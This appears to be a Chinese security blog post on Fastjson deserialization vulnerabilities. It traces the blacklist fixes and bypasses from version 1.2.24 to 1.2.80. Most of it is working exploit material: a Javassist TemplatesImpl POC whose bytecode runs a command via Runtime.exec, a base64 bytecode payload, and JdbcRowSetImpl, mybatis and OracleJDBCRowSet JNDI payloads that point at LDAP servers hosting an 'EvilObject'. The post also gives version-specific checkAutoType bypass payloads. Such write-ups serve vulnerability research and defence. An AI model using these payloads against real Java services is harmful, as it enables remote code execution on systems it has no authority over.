## 概述

[漏洞分析过程](https://roboterh.github.io/2022/03/21/Fastjson反序列化漏洞1/)

在引入了`@type`之后，`JSON.parseObject`调用了`getter/setter`方法，`JSON.parse`调用了`setter`方法

其他的方式也是可以调用getter方法的，但是有条件限制:

```bash
条件一、方法名需要长于4

条件二、不是静态方法

条件三、以get字符串开头，且第四个字符需要是大写字母

条件四、方法不能有参数传入

条件五、继承自Collection || Map || AtomicBoolean || AtomicInteger ||AtomicLong

条件六、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）
```

## 版本修复

- 在**fastjson 1.2.24**之后，引入`checkAutoType`机制，默认关闭`autoTypeSupport`，如果需要打开`checkAutoType`，则使用黑名单，也添加了添加黑名单的接口

- 在**fastjson 1.2.41**之后，在`ParserConfig`中将黑名单进行了hash处理，防止绕过，而在`ParserConfig#checkAutoType`中进行了`L ;`的去除，可以双写绕过

- 在**fastjson 1.2.42**之后，在`ParserConfig#checkAutoType`中如果出现了多个`L`，就会抛出异常，但是前面除了`L` 同样也可以使用`[`

- 在**fastjson 1.2.43**之后修复了利用`[`的漏洞

- 在**fastjson 1.2.45**之后，修复了`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`黑名单绕过

- 在**fastjson 1.2.47**之后，修复了使用`Class.class`绕过`checkAutoType`检查，在`MiscCode`处理Class类的地方，设置Cache为fasle, 并且 loadClass 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去

- 在**fastjson 1.2.50 - fastjson 1.2.51**中在`ParserConfig#checkAutoType#1411`的类过滤中添加了`RowSet.class`，而且将`oracle.jdbc.rowset.OracleJDBCRowSet`添加进入了黑名单

  ```java
              if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                      || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                      || javax.sql.RowSet.class.isAssignableFrom(clazz) //
                      ) {
                  throw new JSONException("autoType is not support. " + typeName);
              }
  ```

  如果是小于`1.2.51`可以使用`1.2.68`的方法进行JNDI RCE(当然需要绕过对应版本的类黑名单)

  ```java
  {
      "@type":"java.lang.AutoCloseable",
      "@type":"oracle.jdbc.rowset.OracleJDBCRowSet",
      "dataSourceName":"ldap://localhost:1389/test",
      "command":"a"
  }
  ```

- 在**fastjson 1.2.68**之后将期望类`java.lang.AutoCloseable`加入黑名单
- 在**fastjson 1.2.80**之后添加了黑名单

## 从写文件或上传文件漏洞到RCE(Spring)

[LandGrey's Blog](https://landgrey.me/blog/22/)

## 内网利用链

[自己的分析文章](https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/)

## 历史漏洞

### fastjson <= 1.2.24

两条利用链：

1. TemplatesImpl
2. JdbcRowSetImpl

#### TemplatesImpl

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类中存在私有变量`_outputProperties`, 他的getter方法满足条件

调用链：

```
//利用链
getOutputProperties()
    newTransformer()
    	getTransletInstance()
    		defineTransletClasses()
    	_class[_transletIndex].newInstance()
```

##### 条件

需要开启`Feature.SupportNonPublicField`特性

##### POC

```java
package pers.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.codec.binary.Base64;

import java.io.IOException;

public class Fj24POC {
    public static class RoboTerh {

    }
    public static String makeClasses() throws NotFoundException, CannotCompileException, IOException {
        
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(RoboTerh.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "RoboTerh" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        byte[] evilCodes = cc.toBytecode();

        return Base64.encodeBase64String(evilCodes);
    }

    public static String exploitString() throws NotFoundException, CannotCompileException, IOException {
        String evilCodeBase64 = makeClasses();
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String exploit = "{'RoboTerh':{" +
                "\"@type\":\"" + NASTY_CLASS + "\"," +
                "\"_bytecodes\":[\"" + evilCodeBase64 + "\"]," +
                "'_name':'RoboTerh'," +
                "'_tfactory':{ }," +
                "'_outputProperties':{ }" +
                "}}\n";

        return exploit;
    }

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
        String exploit = exploitString();
        System.out.println(exploit);
        //JSON.parse(exploit, Feature.SupportNonPublicField);
        //JSON.parseObject(exploit, Feature.SupportNonPublicField);
        JSON.parseObject(exploit, Object.class, Feature.SupportNonPublicField);
    }
}
```

##### Payload

```json
//payload
{"RoboTerh":{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhSb2JvVGVyaAEADElubmVyQ2xhc3NlcwEAIExwZXJzL2Zhc3Rqc29uL0ZqMjRQT0MkUm9ib1Rlcmg7AQAKU291cmNlRmlsZQEADEZqMjRQT0MuamF2YQwABAAFBwATAQAecGVycy9mYXN0anNvbi9GajI0UE9DJFJvYm9UZXJoAQAQamF2YS9sYW5nL09iamVjdAEAFXBlcnMvZmFzdGpzb24vRmoyNFBPQwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAFlJvYm9UZXJoMjY5OTQ4OTExMjAwMDABABhMUm9ib1RlcmgyNjk5NDg5MTEyMDAwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAAPAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk="],'_name':'RoboTerh','_tfactory':{ },'_outputProperties':{ }}}
```

#### JdbcRowSetImpl

`JdbcRowSetImpl`类位于`com.sun.rowset.JdbcRowSetImpl`中

链子的核心触发点是`javax.naming.InitialContext#lookup`的参数可控造成的漏洞

##### 条件

JDNI注入，需要在有网条件下使用

##### POC

```java
package pers.fastjson;

import com.alibaba.fastjson.JSON;

public class Fj24_Jdbc_POC {
    public static void main(String[] args) {
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:8888/EvilObject\"," +
                "\"autoCommit\":\"true\"," +
                "}";
        //JSON.parseObject(payload); 成功
        //JSON.parse(payload); 成功
        JSON.parseObject(payload, Object.class);
    }
}
```

##### Payload

```java
//payload
{"RoboTerh":{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}}
```

### 1.2.25 <= fastjson <= 1.2.41

在`TypeUtils#loadClass`存在逻辑漏洞

#### 条件

需要开启`autoTypeSupport`, 有网

#### POC

```java
package pers.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Fj25_Jdbc_POC {
    public static void main(String[] args) {
        String payload = "{\"RoboTerh\":{" +
                "\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:8888/EvilObject\"," +
                "\"autoCommit\":true" +
                "}}";
        //开启autotype
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject(payload);
    }
}
```

#### Payload

```java
//payload
{
  "RoboTerh": {
    "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName": "ldap://127.0.0.1:8888/EvilObject",
    "autoCommit": true
  }
}
```

### fastjson <= 1.2.42

#### 条件

和上面一个条件类似

#### POC 

```java
package pers.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Fj42_Jdbc_POC {
    public static void main(String[] args) {
        String payload = "{\"RoboTerh\":{" +
                "\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:8888/EvilObject\"," +
                "\"autoCommit\":true" +
                "}}";
        //开启autotype
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject(payload);
    }
}
```

#### Payload

```java
//payload
{
  "RoboTerh": {
    "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName": "ldap://127.0.0.1:8888/EvilObject",
    "autoCommit": true
  }
}
```

### fastjson <= 1.2.43

#### 条件

和上面的条件类似

#### Payload

```java
{
  "RoboTerh": {
    "@type": "[com.sun.rowset.JdbcRowSetImpl"[{,
    "dataSourceName": "ldap://127.0.0.1:8888/EvilObject",
    "autoCommit": true
  }
}
```

### fastjson <= 1.2.45

#### 条件

存在`mybatis`的依赖

有网

开启`autoTypeSupport`

#### Payload

```json
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"ldap://127.0.0.1:23457/Command8"
    }
}
```

### fastjson <= 1.2.47

这个版本可以在不开启`autoTypeSupport`的形况下，进行利用

主要是通过处理`Class.class`类，并将其添加进入缓存中，使得在`checkAutoType`之前让`findClass`可以找到这个类，越过检查

#### Payload

```json
{
	"RoboTerh": {
		"@type": "java.lang.Class",
		"val": "com.sun.rowset.JdbcRowSetImpl"
	},
	"demo": {
		"@type": "com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName": "ldap://127.0.0.1:8888/EvilObject",
		"autoCommit": true
	}
}
```

### fastjson <= 1.2.50

`oracle.jdbc.rowset.OracleJDBCRowSet`黑名单绕过

#### Payload

```java
{
    "@type":"java.lang.AutoCloseable",
    "@type":"oracle.jdbc.rowset.OracleJDBCRowSet",
    "dataSourceName":"ldap://localhost:9999/Evil",
    "command":"a"
}
```

### fastjson <= 1.2.68

参见`AutoCloseable`的使用

## fastjson <= 1.2.80

主要是继承`java.lang.Expection`绕过检验
